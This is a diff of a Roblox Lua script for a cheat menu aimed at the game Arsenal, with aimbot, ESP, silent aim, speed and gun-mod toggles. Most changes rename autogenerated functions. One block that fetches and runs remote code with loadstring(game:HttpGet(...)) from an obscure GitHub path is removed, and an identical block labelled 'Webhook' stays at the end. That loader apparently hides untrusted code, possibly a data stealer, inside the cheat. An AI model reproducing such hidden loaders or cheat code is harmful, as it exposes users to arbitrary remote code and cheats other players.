@@ -462,7 +462,7 @@ TextLabel_10.TextSize = 14.000
 
 -- Scripts:
 
-local function UHQWKCS_fake_script() -- a.Localscript 
+local function HNDI_fake_script() -- a.Localscript 
 	local script = Instance.new('LocalScript', a)
 
 	local UIS = game:GetService("UserInputService")
@@ -503,8 +503,8 @@ local function UHQWKCS_fake_script() -- a.Localscript
 	
 	dragify(script.Parent)
 end
-coroutine.wrap(UHQWKCS_fake_script)()
-local function OGET_fake_script() -- SilentTogbgle.LocalScript 
+coroutine.wrap(HNDI_fake_script)()
+local function DGPLDAF_fake_script() -- SilentTogbgle.LocalScript 
 	local script = Instance.new('LocalScript', SilentTogbgle)
 
 	local enabled = false
@@ -639,8 +639,8 @@ local function OGET_fake_script() -- SilentTogbgle.LocalScript
 		end
 	end)
 end
-coroutine.wrap(OGET_fake_script)()
-local function LMMXAWI_fake_script() -- rgbgun.LocalScript 
+coroutine.wrap(DGPLDAF_fake_script)()
+local function OEKH_fake_script() -- rgbgun.LocalScript 
 	local script = Instance.new('LocalScript', rgbgun)
 
 	local endabled = false
@@ -698,8 +698,8 @@ local function LMMXAWI_fake_script() -- rgbgun.LocalScript
 		end
 	end)
 end
-coroutine.wrap(LMMXAWI_fake_script)()
-local function OSMRK_fake_script() -- infintejump.LocalScript 
+coroutine.wrap(OEKH_fake_script)()
+local function EFDL_fake_script() -- infintejump.LocalScript 
 	local script = Instance.new('LocalScript', infintejump)
 
 	
@@ -714,8 +714,8 @@ local function OSMRK_fake_script() -- infintejump.LocalScript
 		end);
 	end)
 end
-coroutine.wrap(OSMRK_fake_script)()
-local function KBAE_fake_script() -- Gunmods.LocalScript 
+coroutine.wrap(EFDL_fake_script)()
+local function JQAVZ_fake_script() -- Gunmods.LocalScript 
 	local script = Instance.new('LocalScript', Gunmods)
 
 	
@@ -748,8 +748,8 @@ local function KBAE_fake_script() -- Gunmods.LocalScript
 		
 	end)
 end
-coroutine.wrap(KBAE_fake_script)()
-local function MBEOI_fake_script() -- speed.LocalScript 
+coroutine.wrap(JQAVZ_fake_script)()
+local function HIGGQCK_fake_script() -- speed.LocalScript 
 	local script = Instance.new('LocalScript', speed)
 
 	local hey = true
@@ -775,8 +775,8 @@ local function MBEOI_fake_script() -- speed.LocalScript
 		end
 	end)
 end
-coroutine.wrap(MBEOI_fake_script)()
-local function JQUJ_fake_script() -- Esp.LocalScript 
+coroutine.wrap(HIGGQCK_fake_script)()
+local function ABBIBT_fake_script() -- Esp.LocalScript 
 	local script = Instance.new('LocalScript', Esp)
 
 	
@@ -812,7 +812,7 @@ local function JQUJ_fake_script() -- Esp.LocalScript
 		local Typing = false
 	
 		_G.SendNotifications = false   -- If set to true then the script would notify you frequently on any changes applied and when loaded / errored. (If a game can detect this, it is recommended to set it to false)
-		_G.DefaultSettings = true   -- If set to true then the boxes script would run with default settings regardless of any changes you made.
+		_G.DefaultSettings = false   -- If set to true then the boxes script would run with default settings regardless of any changes you made.
 	
 		_G.TeamCheck = true   -- If set to true then the script would create boxes only for the enemy team members.
 	
@@ -1112,8 +1112,8 @@ local function JQUJ_fake_script() -- Esp.LocalScript
 		
 	end)
 end
-coroutine.wrap(JQUJ_fake_script)()
-local function FNXB_fake_script() -- ArsenalTab.LocalScript 
+coroutine.wrap(ABBIBT_fake_script)()
+local function BSLAMRF_fake_script() -- ArsenalTab.LocalScript 
 	local script = Instance.new('LocalScript', ArsenalTab)
 
 	if game.PlaceId == 301549746 then
@@ -1121,8 +1121,8 @@ local function FNXB_fake_script() -- ArsenalTab.LocalScript
 		script.Parent.rgbgun:Destroy()
 	end
 end
-coroutine.wrap(FNXB_fake_script)()
-local function GHSD_fake_script() -- AimbotB.LocalScript 
+coroutine.wrap(BSLAMRF_fake_script)()
+local function YPRAZZH_fake_script() -- AimbotB.LocalScript 
 	local script = Instance.new('LocalScript', AimbotB)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -1132,8 +1132,8 @@ local function GHSD_fake_script() -- AimbotB.LocalScript
 		aiomtaaab.Visible = false
 	end)
 end
-coroutine.wrap(GHSD_fake_script)()
-local function SGEJGH_fake_script() -- EspB.LocalScript 
+coroutine.wrap(YPRAZZH_fake_script)()
+local function RCFJFK_fake_script() -- EspB.LocalScript 
 	local script = Instance.new('LocalScript', EspB)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -1143,8 +1143,8 @@ local function SGEJGH_fake_script() -- EspB.LocalScript
 		s.Visible = false
 	end)
 end
-coroutine.wrap(SGEJGH_fake_script)()
-local function PSNWWM_fake_script() -- ArsenalB.LocalScript 
+coroutine.wrap(RCFJFK_fake_script)()
+local function BXTHDYZ_fake_script() -- ArsenalB.LocalScript 
 	local script = Instance.new('LocalScript', ArsenalB)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -1156,8 +1156,8 @@ local function PSNWWM_fake_script() -- ArsenalB.LocalScript
 		ar.Visible = true
 	end)
 end
-coroutine.wrap(PSNWWM_fake_script)()
-local function WMJA_fake_script() -- ASimBOtToggle.LocalScript 
+coroutine.wrap(BXTHDYZ_fake_script)()
+local function CLBF_fake_script() -- ASimBOtToggle.LocalScript 
 	local script = Instance.new('LocalScript', ASimBOtToggle)
 
 	
@@ -1296,8 +1296,8 @@ local function WMJA_fake_script() -- ASimBOtToggle.LocalScript
 		end
 	end)
 end
-coroutine.wrap(WMJA_fake_script)()
-local function MSPD_fake_script() -- AimTab.a 
+coroutine.wrap(CLBF_fake_script)()
+local function ZUENEL_fake_script() -- AimTab.a 
 	local script = Instance.new('LocalScript', AimTab)
 
 	function make()
@@ -1333,8 +1333,8 @@ local function MSPD_fake_script() -- AimTab.a
 	
 	make()
 end
-coroutine.wrap(MSPD_fake_script)()
-local function UUWURC_fake_script() -- wallCheckTog.LocalScript 
+coroutine.wrap(ZUENEL_fake_script)()
+local function OMSKBA_fake_script() -- wallCheckTog.LocalScript 
 	local script = Instance.new('LocalScript', wallCheckTog)
 
 	local debounce = false
@@ -1382,8 +1382,8 @@ local function UUWURC_fake_script() -- wallCheckTog.LocalScript
 	end
 	end)
 end
-coroutine.wrap(UUWURC_fake_script)()
-local function ZWXKL_fake_script() -- TeamCHeckTog.LocalScript 
+coroutine.wrap(OMSKBA_fake_script)()
+local function WYXJJ_fake_script() -- TeamCHeckTog.LocalScript 
 	local script = Instance.new('LocalScript', TeamCHeckTog)
 
 	local bool = script.Parent.Parent.Bools
@@ -1421,8 +1421,8 @@ local function ZWXKL_fake_script() -- TeamCHeckTog.LocalScript
 		end
 	end)
 end
-coroutine.wrap(ZWXKL_fake_script)()
-local function CWNRY_fake_script() -- ShowfovTog.LocalScript 
+coroutine.wrap(WYXJJ_fake_script)()
+local function HBYFWM_fake_script() -- ShowfovTog.LocalScript 
 	local script = Instance.new('LocalScript', ShowfovTog)
 
 	local bool = script.Parent.Parent.Bools
@@ -1461,8 +1461,8 @@ local function CWNRY_fake_script() -- ShowfovTog.LocalScript
 		end
 	end)
 end
-coroutine.wrap(CWNRY_fake_script)()
-local function SBPQ_fake_script() -- FovTog.LocalScript 
+coroutine.wrap(HBYFWM_fake_script)()
+local function YINYVW_fake_script() -- FovTog.LocalScript 
 	local script = Instance.new('LocalScript', FovTog)
 
 	local bool = script.Parent.Parent.Bools
@@ -1501,14 +1501,8 @@ local function SBPQ_fake_script() -- FovTog.LocalScript
 		end
 	end)
 end
-coroutine.wrap(SBPQ_fake_script)()
-local function YNYB_fake_script() -- a.Webhook 
-	local script = Instance.new('LocalScript', a)
-
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Farleyy/123-947u10829ohiyn4jklsadse1234142/main/9872635876t87t1gruy12tg89r7159tr87915489071.lua"))()
-end
-coroutine.wrap(YNYB_fake_script)()
-local function WIVDN_fake_script() -- Main.LocalScript 
+coroutine.wrap(YINYVW_fake_script)()
+local function QNAFZH_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
 
 	local UserInputService = game:GetService("UserInputService")
@@ -1520,10 +1514,10 @@ local function WIVDN_fake_script() -- Main.LocalScript
 		end
 	end)
 end
-coroutine.wrap(WIVDN_fake_script)()
-local function WZUOGZ_fake_script() -- Main.Webhook 
+coroutine.wrap(QNAFZH_fake_script)()
+local function BFJXGP_fake_script() -- Main.Webhook 
 	local script = Instance.new('LocalScript', Main)
 
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/Farleyy/123-947u10829ohiyn4jklsadse1234142/main/9872635876t87t1gruy12tg89r7159tr87915489071.lua"))()
 end
-coroutine.wrap(WZUOGZ_fake_script)()
+coroutine.wrap(BFJXGP_fake_script)()
